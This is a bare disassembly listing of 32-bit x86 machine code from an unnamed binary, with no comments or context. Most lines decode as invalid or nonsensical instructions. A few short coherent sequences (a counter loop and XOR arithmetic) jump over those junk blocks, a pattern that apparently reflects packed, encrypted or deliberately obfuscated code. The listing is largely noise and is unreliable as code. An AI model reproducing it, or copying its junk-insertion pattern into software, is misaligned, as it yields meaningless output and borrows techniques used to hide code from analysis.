  401915:	or     eax,ecx
  401917:	mov    ebx,0x82eefa17
  40191c:	xor    bh,bh
  40191e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40191f:	rcr    BYTE PTR [eax],cl
  401921:	lea    eax,[eax+0x51]
  401924:	sbb    DWORD PTR [ecx+0x28],esp
  401927:	repz and eax,0x61d62637
  40192d:	mov    edi,0xda752fe9
  401932:	mov    ebp,0x99ce0e6a
  401937:	xchg   ebp,eax
  401938:	and    DWORD PTR ds:0x1183f90b,ebp
  40193e:	mov    ds:0xb823472f,al
  401943:	xor    DWORD PTR [edx],esp
  401945:	mov    BYTE PTR [edx],ah
  401947:	fistp  WORD PTR [ecx+0x659fb396]
  40194d:	mov    al,0xa4
  40194f:	dec    esi
  401950:	ror    DWORD PTR [edi-0x6a57bc05],1
  401956:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401957:	jo     0x4018eb
  401959:	jmp    0x30aa9384
  40195e:	iret   
  40195f:	ss xchg edx,eax
  401961:	cmp    al,0x6a
  401963:	in     al,0x41
  401965:	(bad)  [ebp+0x3b984a14]
  40196b:	js     0x4019b6
  40196d:	xchg   ebp,eax
  40196e:	out    0x16,al
  401970:	rcl    DWORD PTR [ebx+0x77],cl
  401973:	push   es
  401974:	mov    DWORD PTR [ebp-0x49],edi
  401977:	push   0xfffffff4
  401979:	push   0xa7c544ef
  40197e:	pop    ss
  40197f:	cmp    al,0x34
  401981:	xchg   edx,eax
  401982:	and    esi,0xffffffbb
  401985:	fmul   DWORD PTR [eax-0x6ee6624c]
  40198b:	fst    QWORD PTR [eax+0x116bd824]
  401991:	mov    bl,0xc7
  401993:	push   cs
  401994:	icebp  
  401995:	add    bh,BYTE PTR [ebx-0x5899eb72]
  40199b:	inc    eax
  40199c:	jecxz  0x401a02
  40199e:	inc    ecx
  40199f:	adc    ebp,DWORD PTR [ebp+ebp*1+0x7d]
  4019a3:	jbe    0x401927
  4019a5:	pop    DWORD PTR [edx]
  4019a7:	or     BYTE PTR [eax],bh
  4019a9:	mov    dh,cl
  4019ab:	jecxz  0x401a15
  4019ad:	not    esi
  4019af:	fs scas eax,DWORD PTR es:[edi]
  4019b1:	inc    ebp
  4019b2:	pop    eax
  4019b3:	inc    edi
  4019b4:	or     eax,0xe03feb6f
  4019b9:	mov    ds:0x5278528a,al
  4019be:	(bad)  
  4019bf:	lods   al,BYTE PTR ds:[esi]
  4019c0:	xchg   DWORD PTR [eax],esi
  4019c2:	add    dh,BYTE PTR [eax-0x155f0c80]
  4019c8:	inc    esp
  4019c9:	push   esp
  4019ca:	inc    ebx
  4019cb:	xor    BYTE PTR [esi+0x5db2e998],cl
  4019d1:	mov    ch,0xb0
  4019d3:	ins    DWORD PTR es:[edi],dx
  4019d4:	fnstenv [edi+0x2529bf06]
  4019da:	es add al,0xb0
  4019dd:	aam    0x37
  4019df:	sbb    al,0x21
  4019e1:	ret    0xdd96
  4019e4:	mov    bl,0x97
  4019e6:	add    BYTE PTR [ebx],0x51
  4019e9:	and    BYTE PTR [esi],dh
  4019eb:	fimul  WORD PTR [ebx]
  4019ed:	pop    eax
  4019ee:	pop    edi
  4019ef:	mov    esp,0x859f84dc
  4019f4:	out    0x82,al
  4019f6:	ins    DWORD PTR es:[edi],dx
  4019f7:	mov    cl,0x38
  4019f9:	js     0x401a29
  4019fb:	dec    edi
  4019fc:	fadd   QWORD PTR [ecx-0x5ba40338]
  401a02:	in     al,dx
  401a03:	mul    BYTE PTR [ebp-0x3d]
  401a06:	je     0x401a1d
  401a08:	jp     0x401a00
  401a0a:	pop    ebp
  401a0b:	mov    esi,0x31eef135
  401a10:	call   0x7d1ab2b2
  401a15:	mov    fs,WORD PTR [esi]
  401a17:	push   ebx
  401a18:	or     edx,DWORD PTR [edx+ecx*2-0x2cfac1b4]
  401a1f:	push   ds
  401a20:	cmp    ch,cl
  401a22:	outs   dx,DWORD PTR ds:[esi]
  401a23:	fwait
  401a24:	pushf  
  401a25:	and    BYTE PTR [ebp-0x200b3f98],bh
  401a2b:	add    edx,DWORD PTR [ebp-0x62800c49]
  401a31:	outs   dx,DWORD PTR ds:[esi]
  401a32:	aad    0xcc
  401a34:	xor    DWORD PTR [edi+esi*2],ebx
  401a37:	sbb    BYTE PTR [esi+0xb],cl
  401a3a:	dec    ecx
  401a3b:	mov    dh,0x6
  401a3d:	mov    eax,ds:0x7ab6a5a5
  401a42:	sub    eax,0xa148bd09
  401a47:	shr    bl,0xb1
  401a4a:	out    dx,eax
  401a4b:	(bad)  [ecx-0x63]
  401a4e:	imul   ebp,DWORD PTR [ebx],0x16
  401a51:	jle    0x4019e9
  401a53:	cmp    eax,0x7d80fc23
  401a58:	in     eax,0xf6
  401a5a:	or     esp,esp
  401a5c:	stc    
  401a5d:	xchg   BYTE PTR [ebx],bl
  401a5f:	mov    ah,0x80
  401a61:	xchg   ebp,eax
  401a62:	mov    eax,DWORD PTR [ebp+0x8]
  401a65:	and    DWORD PTR ds:0x4346cf,0x0
  401a6f:	mov    ecx,DWORD PTR ds:0x4346cf
  401a75:	inc    ecx
  401a76:	mov    DWORD PTR ds:0x4346cf,ecx
  401a7c:	cmp    DWORD PTR ds:0x4346cf,0x5
  401a83:	jne    0x401a92
  401a89:	push   DWORD PTR [ebp-0x24]
  401a8c:	call   DWORD PTR ds:0x413274
  401a92:	cmp    DWORD PTR ds:0x4346cf,0x4
  401a99:	jne    0x401aae
  401a9f:	xor    ecx,ecx
  401aa1:	or     ecx,DWORD PTR ds:0x4346cf
  401aa7:	inc    ecx
  401aa8:	mov    DWORD PTR ds:0x4346cf,ecx
  401aae:	cmp    DWORD PTR ds:0x4346cf,0x11
  401ab5:	jb     0x401a6f
  401abb:	mov    ecx,DWORD PTR [ebp-0x10]
  401abe:	xor    eax,esi
  401ac0:	add    eax,edi
  401ac2:	mov    DWORD PTR [ecx],eax
  401ac4:	mov    eax,DWORD PTR [ebp-0x10]
  401ac7:	mov    ecx,DWORD PTR [ebp+0x10]
  401aca:	xor    ecx,esi
  401acc:	mov    edx,0xffcd8d67
  401ad1:	sub    edx,ecx
  401ad3:	add    DWORD PTR [eax],edx
  401ad5:	jmp    0x401ca9
  401ada:	icebp  
  401adb:	jmp    0x401a65
  401add:	imul   ebx,DWORD PTR [ebp+esi*2-0x17498c0f],0x84ed485e
  401ae8:	add    BYTE PTR [esi],0x52
  401aeb:	add    al,0x7e
  401aed:	jle    0x401aa4
  401aef:	jg     0x401b6f
  401af1:	jle    0x401b51
  401af3:	repz adc ebx,edx
  401af6:	shr    BYTE PTR [edi-0x2dd43ae4],1
  401afc:	push   ds
  401afd:	inc    ebp
  401afe:	xor    eax,0xb8f4ccb9
  401b03:	in     eax,dx
  401b04:	in     eax,0x8c
  401b06:	icebp  
  401b07:	addr16 jno 0x401af1
  401b0a:	xor    dl,BYTE PTR [eax+ebx*2-0x15]
  401b0e:	or     BYTE PTR fs:[eax-0x78],ah
  401b12:	or     BYTE PTR [ebx],dh
  401b14:	sub    DWORD PTR [ecx],ebp
  401b16:	or     BYTE PTR [edi-0x96b4d83],bl
  401b1c:	lods   al,BYTE PTR ds:[esi]
  401b1d:	adc    al,0x30
  401b1f:	in     al,dx
  401b20:	add    dl,BYTE PTR [ecx]
  401b22:	mov    bh,0x8c
  401b24:	out    dx,eax
  401b25:	in     eax,dx
  401b26:	pop    ebp
  401b27:	cdq    
  401b28:	mov    edi,0xbf1c7931
  401b2d:	cmp    al,0x3e
  401b2f:	ds mov edx,0x33042299
  401b35:	cmp    DWORD PTR [ecx],0x5f
  401b38:	sub    al,0x42
  401b3a:	or     esi,edx
  401b3c:	lds    ebx,FWORD PTR [ebp+0x3d4a2ba9]
  401b42:	jo     0x401b7e
  401b44:	jno    0x401b0d
  401b46:	out    dx,eax
  401b47:	jne    0x401b49
  401b49:	retf   0x3249
  401b4c:	fcmovb st,st(5)
  401b4e:	stos   BYTE PTR es:[edi],al
  401b4f:	int3   
  401b50:	pop    ss
  401b51:	add    DWORD PTR [ecx-0x10541bc9],esi
  401b57:	xchg   ebp,eax
  401b58:	push   ss
  401b59:	lods   eax,DWORD PTR ds:[esi]
  401b5a:	aas    
  401b5b:	imul   esi,DWORD PTR [eax],0x38e56142
  401b61:	cs sbb edx,ebp
  401b64:	lea    eax,[ebp+0xca4cb48]
  401b6a:	pusha  
  401b6b:	fnstsw WORD PTR [ebx-0x4c554484]
  401b71:	and    edx,DWORD PTR [ecx-0x74145a5c]
  401b77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b78:	hlt    
  401b79:	mov    bh,0x83
  401b7b:	push   ecx
  401b7c:	ret    0xb7af
  401b7f:	retf   0x6bed
  401b82:	sub    BYTE PTR [edx+eax*1+0x1eecd605],dl
  401b89:	test   DWORD PTR [edi],ebp
  401b8b:	pop    edx
  401b8c:	or     ebx,DWORD PTR [edx+0x3f]
  401b8f:	jmp    0x81e8bdba
  401b94:	sub    eax,0xcc7cb5a0
  401b99:	push   ecx
  401b9a:	rcr    BYTE PTR fs:[edi],1
  401b9d:	addr16 (bad) 
  401ba0:	cmc    
  401ba1:	sub    dl,cl
  401ba3:	lods   al,BYTE PTR ds:[esi]
  401ba4:	data16 mov al,ds:0xe073504a
  401baa:	inc    edi
  401bab:	loope  0x401be6
  401bad:	fwait
  401bae:	into   
  401baf:	int    0x45
  401bb1:	mov    dh,0x39
  401bb3:	scas   al,BYTE PTR es:[edi]
  401bb4:	mov    dh,0xb4
  401bb6:	into   
  401bb7:	ins    DWORD PTR es:[edi],dx
  401bb8:	iret   
  401bb9:	dec    ebp
  401bba:	retf   0x860f
  401bbd:	std    
  401bbe:	iret   
  401bbf:	mov    eax,0x3a63bfe6
  401bc4:	xchg   DWORD PTR [edx],ebp
  401bc6:	je     0x401b96
  401bc8:	outs   dx,BYTE PTR ds:[esi]
  401bc9:	pop    ecx
  401bca:	in     eax,dx
  401bcb:	loope  0x401c48
  401bcd:	jb     0x401c2d
  401bcf:	cmc    
  401bd0:	push   esp
  401bd1:	cld    
  401bd2:	into   
  401bd3:	loope  0x401bca
  401bd5:	sar    edi,0xdc
  401bd8:	cmc    
  401bd9:	jl     0x401c11
  401bdb:	lock mov esp,0x54b7c301
  401be1:	dec    edx
  401be2:	lahf   
  401be3:	lea    esp,[edi+0x24]
  401be6:	fiadd  DWORD PTR [ebx]
  401be8:	ins    DWORD PTR es:[edi],dx
  401be9:	mov    dh,0x5a
  401beb:	adc    esp,ecx
  401bed:	fwait
  401bee:	int    0xbd
  401bf0:	dec    ecx
  401bf1:	shr    cl,1
  401bf3:	aas    
  401bf4:	sbb    ebx,DWORD PTR ds:0x55299329
  401bfa:	lahf   
  401bfb:	pop    ebp
  401bfc:	add    bl,ah
  401bfe:	mov    esp,ebx
  401c00:	pop    ds
  401c01:	sti    
  401c02:	xor    eax,0x2d2c22ed
  401c07:	mov    edi,0xc8879fa9
  401c0c:	fild   WORD PTR es:[ebp+0x1d358ef3]
  401c13:	jne    0x401c89
  401c15:	daa    
  401c16:	inc    edx
  401c17:	sbb    eax,0xfb809a14
  401c1c:	xchg   edx,eax
  401c1d:	mov    edi,0x47291ddf
  401c22:	loop   0x401be2
  401c24:	inc    ecx
  401c25:	mov    ds:0x2890249e,al
  401c2a:	xor    al,0x8c
  401c2c:	loope  0x401c56
  401c2e:	sbb    BYTE PTR [ebx],dl
  401c30:	sub    al,0x6
  401c32:	js     0x401ca8
  401c34:	push   edx
  401c35:	mov    bl,0xf9
  401c37:	pop    ebx
  401c38:	fbstp  TBYTE PTR [ebx-0x77f2dab0]
  401c3e:	cmp    al,0x33
  401c40:	mov    al,ds:0x3d44bc8
  401c45:	mov    edx,0xe55ec3e1
  401c4a:	aas    
  401c4b:	cwde   
  401c4c:	scas   eax,DWORD PTR es:[edi]
  401c4d:	lds    esp,FWORD PTR [edx]
  401c4f:	cld    
  401c50:	add    dh,BYTE PTR [ebx]
  401c52:	leave  
  401c53:	xlat   BYTE PTR ds:[ebx]
  401c54:	mov    BYTE PTR [esi-0x5c],bl
  401c57:	mov    esp,0xc78c8cdb
  401c5c:	(bad)  
  401c5d:	xchg   BYTE PTR [edi+eiz*1],dl
  401c60:	pop    ebp
  401c61:	and    esp,ecx
  401c63:	dec    esp
  401c64:	js     0x401c1e
  401c66:	jg     0x401c8e
  401c68:	inc    ebp
  401c69:	cmp    cl,BYTE PTR [eax+0x433455ac]
  401c6f:	mov    edx,DWORD PTR [esi]
  401c71:	pop    ss
  401c72:	push   ebp
  401c73:	xor    al,0x2a
  401c75:	aaa    
  401c76:	outs   dx,WORD PTR ds:[esi]
  401c78:	not    WORD PTR [eax-0x52]
  401c7c:	push   ebp
  401c7d:	or     eax,DWORD PTR [eax]
  401c7f:	call   0x3bad:0x6081ac48
  401c86:	sub    DWORD PTR [ebx+0x17fa44f6],edx
  401c8c:	or     cl,bh
  401c8e:	push   es
  401c8f:	in     eax,dx
  401c90:	fs push edx
  401c92:	mov    eax,0x9a84d641
  401c97:	xor    DWORD PTR [esp+eiz*2+0xffa02b1],0x4396b2da
  401ca2:	adc    al,0x43
  401ca4:	in     al,dx
  401ca5:	je     0x401c8a
  401ca7:	push   ds
  401ca8:	sub    esp,DWORD PTR [ecx+0x414bd2]
  401cae:	mov    eax,DWORD PTR [eax]
  401cb0:	mov    cx,WORD PTR [ebp-0x4]
  401cb4:	movzx  ecx,cx
  401cb7:	add    ecx,DWORD PTR [eax]
  401cb9:	jmp    0x401e8d
  401cbe:	push   edi
  401cbf:	mov    DWORD PTR ds:0x7d73cde7,eax
  401cc5:	test   eax,0x7c3826d3
  401cca:	push   es
  401ccb:	clc    
  401ccc:	inc    eax
  401ccd:	cmp    DWORD PTR [ecx-0x4a8181fa],ecx
  401cd3:	jg     0x401d53
  401cd5:	jle    0x401d0e
  401cd7:	xor    ebx,DWORD PTR [ecx]
  401cd9:	popf   
  401cda:	rcr    DWORD PTR [edi-0x3c9d07b],0xe7
  401ce1:	aam    0x40
  401ce3:	js     0x401d35
  401ce5:	mov    cl,0xc1
  401ce7:	pushf  
  401ce8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ce9:	or     eax,DWORD PTR [edx]
  401ceb:	mov    edx,0xd9004de7
  401cf0:	dec    eax
  401cf1:	lahf   
  401cf2:	xor    cl,BYTE PTR [edi-0x5b58175e]
  401cf8:	hlt    
  401cf9:	push   ebx
  401cfa:	jo     0x401cfb
  401cfc:	imul   esi,eax,0x11
  401cff:	cli    
  401d00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d01:	popa   
  401d02:	mov    eax,ds:0xc7d8674b
  401d07:	frstor ds:0xaca9d985
  401d0d:	jno    0x401d50
  401d0f:	lds    edi,FWORD PTR ds:0xa1350ecd
  401d15:	loope  0x401cc5
  401d17:	popa   
  401d18:	dec    ebx
  401d19:	mov    ecx,0xcf92e621
  401d1e:	cmp    eax,0x3ca1bf35
  401d23:	retf   
  401d24:	and    al,0x29
  401d26:	inc    ebp
  401d27:	cmp    BYTE PTR [edx+0x494cc60f],dl
  401d2d:	xchg   esp,eax
  401d2e:	or     eax,0x2e9322f5
  401d33:	es ret 
  401d35:	out    dx,al
  401d36:	or     DWORD PTR [edi],ecx
  401d38:	test   eax,0xdeca6aeb
  401d3d:	and    bl,BYTE PTR [esi-0x811e085]
  401d43:	inc    eax
  401d44:	ins    BYTE PTR es:[edi],dx
  401d45:	or     eax,esp
  401d47:	es rcr esp,1
  401d4a:	jle    0x401d1e
  401d4c:	ret    0x3391
  401d4f:	mov    ebx,0x27e433a3
  401d54:	loop   0x401d81
  401d56:	sahf   
  401d57:	sub    BYTE PTR [ebx+eiz*2],dl
  401d5a:	js     0x401d7e
  401d5c:	into   
  401d5d:	es pop ebp
  401d5f:	jge    0x401d3f
  401d61:	push   ebx
  401d62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d63:	fnsave [ecx+0x7b4bf03f]
  401d69:	cli    
  401d6a:	js     0x401d70
  401d6c:	mov    WORD PTR [eax-0x76f09a30],ss
  401d72:	mov    edi,0xcd653c6e
  401d77:	outs   dx,DWORD PTR ds:[esi]
  401d78:	dec    ebp
  401d79:	jmp    0x1217cca9
  401d7e:	dec    ecx
  401d7f:	dec    ebp
  401d80:	xchg   ebx,eax
  401d81:	pop    ds
  401d82:	jno    0x401d26
  401d84:	sub    eax,0x1556a00
  401d89:	fisttp WORD PTR [ebp-0x68]
  401d8c:	mov    al,ds:0xe282a0b7
  401d91:	pop    es
  401d92:	pushf  
  401d93:	aad    0x1d
  401d95:	jbe    0x401df6
  401d97:	call   0x23b5c08b
  401d9c:	jnp    0x401dd2
  401d9e:	mov    DWORD PTR ds:0x6440cf8,edi
  401da4:	mov    bh,0x24
  401da6:	jne    0x401d76
  401da8:	icebp  
  401da9:	outs   dx,BYTE PTR ds:[esi]
  401daa:	or     al,0xf3
  401dac:	and    cl,BYTE PTR [esi+0x44]
  401daf:	add    bl,ch
  401db1:	cli    
  401db2:	mov    edi,0xd3e7997d
  401db7:	inc    ebx
  401db8:	dec    ebx
  401db9:	(bad)  
  401dba:	rcl    BYTE PTR [ebp+0x1e],cl
  401dbd:	inc    esp
  401dbe:	mov    dl,0x83
  401dc0:	dec    edx
  401dc1:	sbb    al,0x9
  401dc3:	popa   
  401dc4:	loop   0x401dd7
  401dc6:	mov    al,ds:0x86b05185
  401dcb:	in     al,dx
  401dcc:	pop    ebp
  401dcd:	jns    0x401dbd
  401dcf:	lods   al,BYTE PTR ds:[esi]
  401dd0:	shl    DWORD PTR [eax+0x10],1
  401dd3:	cmc    
  401dd4:	push   cs
  401dd5:	lahf   
  401dd6:	xor    ebx,DWORD PTR [eax]
  401dd8:	ds retf 
  401dda:	mov    ebx,0xbf9ad9ec
  401ddf:	and    BYTE PTR [ebp*4-0x29df039d],dl
  401de6:	xchg   edi,eax
  401de7:	jb     0x401d9c
  401de9:	xor    eax,0x10c3c963
  401dee:	add    eax,0x3293fab6
  401df3:	(bad)  [ebp+edx*1-0xe]
  401df7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401df8:	push   0x1b8bd9be
  401dfd:	nop
  401dfe:	repz mov bl,0xa8
  401e01:	sbb    BYTE PTR [edi],al
  401e03:	dec    ebx
  401e04:	mov    ds,esp
  401e06:	xchg   esp,eax
  401e07:	mov    ds:0x96b71e9f,al
  401e0c:	in     al,0x17
  401e0e:	lock (bad) 
  401e10:	in     al,0x1a
  401e12:	aad    0xb8
  401e14:	syscall 
  401e16:	out    dx,al
  401e17:	adc    BYTE PTR [edi+0x63],dl
  401e1a:	cdq    
  401e1b:	sub    ebx,DWORD PTR [ecx]
  401e1d:	adc    DWORD PTR ss:0x58cd7dc6,ecx
  401e24:	xlat   BYTE PTR ds:[ebx]
  401e25:	sbb    dl,BYTE PTR [eax+0x64]
  401e28:	push   0xc5c6e9c9
  401e2d:	adc    al,BYTE PTR [ebp+0x19]
  401e30:	adc    BYTE PTR [ecx],ah
  401e32:	xlat   BYTE PTR ds:[ebx]
  401e33:	add    cl,BYTE PTR ds:0x4daf0814
  401e39:	(bad)  
  401e3b:	xor    eax,0x4e3acabb
  401e40:	adc    DWORD PTR [ebx+ebp*2+0x5],ebp
  401e44:	aam    0xac
  401e46:	add    al,0xbb
  401e48:	jns    0x401e14
  401e4a:	lods   al,BYTE PTR ds:[esi]
  401e4b:	sub    BYTE PTR [edx+0x35465bcc],0x14
  401e52:	push   edx
  401e53:	jnp    0x401ea6
  401e55:	xor    DWORD PTR [esi],esi
  401e57:	ror    BYTE PTR [edi-0x45],1
  401e5a:	neg    DWORD PTR [edx]
  401e5c:	in     al,0x7d
  401e5e:	mov    edi,0xbea1a44
  401e63:	fcom   QWORD PTR [esi+0x24]
  401e66:	jecxz  0x401e6c
  401e68:	sub    eax,0x33c55f51
  401e6d:	nop
  401e6e:	xchg   ecx,eax
  401e6f:	sbb    BYTE PTR [ecx],ah
  401e71:	adc    eax,0x712bc9c
  401e76:	(bad)  
  401e77:	repz into 
  401e79:	pop    ebx
  401e7a:	mov    dh,0xf1
  401e7c:	mov    al,ds:0x46f1c409
  401e81:	mov    esp,DWORD PTR [esi+0x74]
  401e84:	ss dec eax
  401e86:	pop    ss
  401e87:	jb     0x401ef0
  401e89:	adc    bl,dl
  401e8b:	sub    al,0x19
  401e8d:	mov    DWORD PTR [ebp-0x18],ecx
  401e90:	mov    eax,DWORD PTR [ebp+0xc]
  401e93:	mov    ecx,DWORD PTR [ebp+0xc]
  401e96:	xor    eax,esi
  401e98:	add    eax,eax
  401e9a:	xor    ecx,esi
  401e9c:	sub    ecx,eax
  401e9e:	jmp    0x402072
  401ea3:	xchg   ecx,eax
  401ea4:	sahf   
  401ea5:	loopne 0x401e95
  401ea7:	icebp  
  401ea8:	jo     0x401e3b
  401eaa:	popa   
  401eab:	mov    eax,ds
  401ead:	cmp    DWORD PTR [edi],esi
  401eaf:	mov    eax,0xc011720c
  401eb4:	add    BYTE PTR [esi+0x7e],bh
  401eb7:	mov    ch,0x7f
  401eb9:	jle    0x401f39
  401ebb:	ret    0x8f2a
  401ebe:	jmp    0x268258af
  401ec3:	pop    ds
  401ec4:	sbb    BYTE PTR [bx+si+0x57cd],bl
  401ec9:	and    DWORD PTR [ecx+esi*2-0x5b],0x957131b3
  401ed1:	in     eax,0xc5
  401ed3:	pop    ecx
  401ed4:	jbe    0x401e9d
  401ed6:	or     al,0x72
  401ed8:	jnp    0x401f1f
  401eda:	aad    0xd3
  401edc:	mov    dl,BYTE PTR [esi+0x57f5ab3a]
  401ee2:	jb     0x401f25
  401ee4:	fs fwait
  401ee6:	cmp    eax,0xb1248f62
  401eeb:	call   0x902e33bf
  401ef0:	fisub  DWORD PTR [edx-0x2b]
  401ef3:	aad    0xe4
  401ef5:	push   ebx
  401ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ef7:	mov    al,0x99
  401ef9:	lock mov ebp,0xdcb45530
  401eff:	cs inc esi
  401f01:	loopne 0x401eeb
  401f03:	imul   ebp,ebx,0xffffffb1
  401f06:	mov    dl,dh
  401f08:	cli    
  401f09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f0a:	pop    ss
  401f0b:	js     0x401f3b
  401f0d:	or     ch,dh
  401f0f:	mov    esi,0xca77a76b
  401f14:	pop    eax
  401f15:	les    eax,FWORD PTR [esi+eax*4+0x4c92f79a]
  401f1c:	add    ch,dl
  401f1e:	iret   
  401f1f:	cmp    DWORD PTR fs:[edi-0x5c01b469],esp
  401f26:	sub    BYTE PTR [ecx],al
  401f28:	(bad)  
  401f29:	pop    ebp
  401f2a:	inc    ebp
  401f2b:	mov    eax,0x83f90a0
  401f30:	sar    DWORD PTR [bx-0x5134],1
  401f35:	jne    0x401f61
  401f37:	jno    0x401f0f
  401f39:	xor    BYTE PTR [ebp+edx*2+0x18ee5915],ch
  401f40:	out    0x4a,al
  401f42:	imul   ebp,DWORD PTR ds:0x927c3a86,0xef01a00e
  401f4c:	or     al,0x10
  401f4e:	sub    al,BYTE PTR [ecx]
  401f50:	sub    BYTE PTR [ecx],ch
  401f52:	(bad)  
  401f53:	mov    edx,0xdc2ce18a
  401f58:	cs ins BYTE PTR es:[edi],dx
  401f5a:	mov    WORD PTR [edx+0x58],ds
  401f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f5e:	cwde   
  401f5f:	push   cs
  401f60:	push   ds
  401f61:	lods   al,BYTE PTR ds:[esi]
  401f62:	jmp    0x8dee:0xbfd499e3
  401f69:	stc    
  401f6a:	cmp    ah,bl
  401f6c:	sahf   
  401f6d:	in     eax,dx
  401f6e:	cmc    
  401f6f:	and    eax,0x314d9b22
  401f74:	jo     0x401f65
  401f76:	and    dl,BYTE PTR [edi-0x19fbe9df]
  401f7c:	mov    WORD PTR [edi],?
  401f7e:	xchg   bl,bh
  401f80:	rcl    BYTE PTR [ecx+0x33],cl
  401f83:	push   ds
  401f84:	rol    DWORD PTR [edi-0x139187c6],0x8b
  401f8b:	add    esi,DWORD PTR [esi+0xf]
  401f8e:	sti    
  401f8f:	add    eax,0xa7286360
  401f94:	stos   DWORD PTR es:[edi],eax
  401f95:	cmc    
  401f96:	inc    ecx
  401f97:	repz test dh,0x0
  401f9b:	rol    BYTE PTR [edi-0x77f2c61d],0xa
  401fa2:	sub    al,0xfa
  401fa4:	imul   eax,DWORD PTR [eax-0x7e29dcca],0x8105e2d8
  401fae:	pop    es
  401faf:	std    
  401fb0:	mov    esi,ecx
  401fb2:	fmulp  st(2),st
  401fb4:	out    dx,al
  401fb5:	dec    ebp
  401fb6:	xchg   edx,eax
  401fb7:	mov    ecx,0x7b0f0360
  401fbc:	call   0x3abf532f
  401fc1:	mov    eax,ds:0x97bece88
  401fc6:	mov    cl,0xba
  401fc8:	ficomp WORD PTR [esi-0x638f29d3]
  401fce:	xchg   edx,eax
  401fcf:	jp     0x402018
  401fd1:	cmc    
  401fd2:	fisttp DWORD PTR [edi]
  401fd4:	add    al,0xbe
  401fd6:	call   0xdd4bf70f
  401fdb:	jl     0x40205a
  401fdd:	pop    ebp
  401fde:	inc    eax
  401fdf:	lahf   
  401fe0:	gs fwait
  401fe2:	clc    
  401fe3:	fiadd  WORD PTR [edi-0x3d]
  401fe6:	cwde   
  401fe7:	inc    eax
  401fe8:	xor    eax,DWORD PTR [edi-0x71]
  401feb:	xor    eax,0xa269b866
  401ff0:	push   ss
  401ff1:	out    0x3a,eax
  401ff3:	(bad)  
  401ff4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ff5:	cld    
  401ff6:	mov    al,0x5b
  401ff8:	ret    0x52e2
  401ffb:	dec    ebx
  401ffc:	mov    bh,0x5
  401ffe:	or     eax,0x446c8865
  402003:	(bad)  
  402005:	call   0x6095:0xb9a0c378
  40200c:	mov    eax,ds:0x68efb537
  402011:	(bad)  
  402012:	out    dx,eax
  402013:	out    0xe7,al
  402015:	pop    ss
  402016:	adc    eax,0x8c7550b7
  40201b:	fnstsw WORD PTR ds:0xc7980956
  402021:	xchg   ah,bh
  402023:	push   eax
  402024:	dec    edi
  402025:	xor    bh,al
  402027:	aas    
  402028:	lods   al,BYTE PTR ds:[esi]
  402029:	mul    BYTE PTR [edx-0x32]
  40202c:	mov    ah,0x9d
  40202e:	sub    ch,BYTE PTR [ecx-0x7d]
  402031:	push   esp
  402032:	xor    bh,al
  402034:	cli    
  402035:	inc    eax
  402036:	stos   DWORD PTR es:[edi],eax
  402037:	mov    cl,0xac
  402039:	add    BYTE PTR [ebx-0x1a],0x6a
  40203d:	or     DWORD PTR [ebx+eiz*4-0x3],ecx
  402041:	cld    
  402042:	inc    edx
  402043:	and    edi,DWORD PTR [eax+0x3a]
  402046:	and    DWORD PTR [eax+0x2d],eax
  402049:	xor    esi,esp
  40204b:	or     eax,0x38ab3099
  402050:	jmp    0x8ca467a6
  402055:	js     0x40207f
  402057:	jae    0x4020ab
  402059:	push   ss
  40205a:	sahf   
  40205b:	icebp  
  40205c:	mov    esi,0x11b2cd45
  402061:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402062:	xchg   ebp,eax
  402063:	mov    ebp,0xbeece938
  402068:	aaa    
  402069:	mov    ebp,0xd31f85b9
  40206e:	out    0xfb,al
  402070:	outs   dx,BYTE PTR ds:[esi]
  402071:	repnz mov ax,WORD PTR [ebp-0x4]
  402076:	movzx  eax,ax
  402079:	sub    ecx,edi
  40207b:	cmp    eax,ecx
  40207d:	mov    eax,DWORD PTR [ebp+0x10]
  402080:	movzx  ecx,WORD PTR [ebp-0x4]
  402084:	jg     0x40226d
  40208a:	xor    eax,esi
  40208c:	sub    ecx,eax
  40208e:	sub    ecx,edi
  402090:	jmp    0x402264
  402095:	pop    es
  402096:	sbb    DWORD PTR [ecx+ebx*2],esi
  402099:	cmp    al,0x75
  40209b:	push   ebx
  40209c:	popa   
  40209d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40209e:	ins    DWORD PTR es:[edi],dx
  40209f:	std    
  4020a0:	and    DWORD PTR [edx+eiz*2+0x27fe443],ecx
  4020a7:	jle    0x402127
  4020a9:	mov    ch,0x7f
  4020ab:	jle    0x40212b
  4020ad:	push   esi
  4020ae:	sub    eax,0x759fb627
  4020b3:	bound  edi,QWORD PTR [esi-0x5e]
  4020b6:	sub    ecx,DWORD PTR [esi]
  4020b8:	xor    ebx,eax
  4020ba:	jge    0x40204b
  4020bc:	mov    al,ds:0x9ee20153
  4020c1:	jecxz  0x4020fb
  4020c3:	xor    dl,ah
  4020c5:	cmp    ebx,0xffffff85
  4020c8:	(bad)  
  4020c9:	fxch   st(0)
  4020cb:	shr    BYTE PTR [ebx+0x45],1
  4020ce:	push   0x11f67d64
  4020d3:	iret   
  4020d4:	mov    esp,0xc79cee75
  4020d9:	fisub  WORD PTR [ebx]
  4020db:	out    0x91,al
  4020dd:	lods   eax,DWORD PTR ds:[esi]
  4020de:	retf   0xde9d
  4020e1:	lds    ebp,FWORD PTR [esi+0x68]
  4020e4:	mov    ds:0x2eedcc46,al
  4020e9:	cli    
  4020ea:	push   ebx
  4020eb:	rcr    BYTE PTR [edi+eax*1],0x48
  4020ef:	xor    esp,DWORD PTR [ebx+0x68]
  4020f2:	mov    ah,0xc8
  4020f4:	xchg   DWORD PTR [edi+edx*8-0x28],esi
  4020f8:	sub    dh,BYTE PTR [edx]
  4020fa:	daa    
  4020fb:	xor    bl,dl
  4020fd:	fst    QWORD PTR [esi]
  4020ff:	(bad)  
  402101:	pop    ecx
  402102:	or     al,al
  402104:	adc    eax,0xd34c0adf
  402109:	inc    eax
  40210a:	pop    es
